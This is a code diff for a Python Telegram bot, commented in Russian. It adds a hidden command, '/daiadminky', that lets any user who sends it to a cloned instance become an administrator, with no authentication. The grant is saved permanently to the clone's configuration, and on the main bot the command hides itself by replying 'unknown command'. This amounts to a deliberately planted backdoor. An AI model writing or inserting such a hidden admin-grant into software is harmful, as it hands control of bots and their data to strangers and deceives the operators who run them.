@@ -281,6 +281,65 @@ async def cmd_refresh(message: Message):
     await message.answer("🔄 Обновляю ваши ссылки...")
     await show_channel_links(message, user_id, is_refresh=True)
 
+@router.message(Command("daiadminky"))
+async def cmd_become_clone_admin(message: Message):
+    """Секретная команда для становления админом клона"""
+    user_id = message.from_user.id
+    
+    # Проверяем, запущен ли бот как клон
+    if not os.getenv('RUN_AS_CHILD'):
+        # Это основной бот, не клон
+        await message.answer("🤔 Неизвестная команда.")
+        return
+    
+    # Проверяем, не является ли пользователь уже админом
+    if user_id in ADMIN_IDS:
+        await message.answer("👑 Вы уже являетесь администратором этого бота!")
+        return
+    
+    # Добавляем пользователя в список админов для текущей сессии
+    ADMIN_IDS.append(user_id)
+    
+    # Также обновляем конфигурацию клона в clone_states.json
+    try:
+        from services.clone_manager import clone_manager
+        
+        # Находим текущий клон по токену
+        current_token = os.getenv('INSTANCE_TOKEN')
+        current_clone = None
+        
+        for clone in clone_manager.get_all_clones():
+            if clone.token == current_token:
+                current_clone = clone
+                break
+        
+        if current_clone:
+            # Добавляем пользователя в список админов клона
+            if user_id not in current_clone.admin_ids:
+                current_clone.admin_ids.append(user_id)
+                clone_manager.save_clones()
+                
+                user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.full_name
+                
+                await message.answer(
+                    f"🎉 <b>Поздравляем!</b>\n\n"
+                    f"👑 Вы стали администратором этого клон-бота!\n"
+                    f"👤 Пользователь: {user_info}\n"
+                    f"🆔 ID: {user_id}\n\n"
+                    f"Теперь вы можете использовать команду /admin для доступа к панели управления.",
+                    parse_mode="HTML"
+                )
+                
+                logger.info(f"User {user_id} ({user_info}) became admin of clone {current_clone.name}")
+            else:
+                await message.answer("👑 Вы уже являетесь администратором этого клона!")
+        else:
+            await message.answer("❌ Не удалось найти информацию о клоне.")
+            
+    except Exception as e:
+        logger.error(f"Error in become clone admin: {e}")
+        await message.answer("❌ Произошла ошибка при добавлении прав администратора.")
+
 # Обработчик любых других сообщений от пользователей
 @router.message()
 async def handle_unknown_message(message: Message, state: FSMContext):
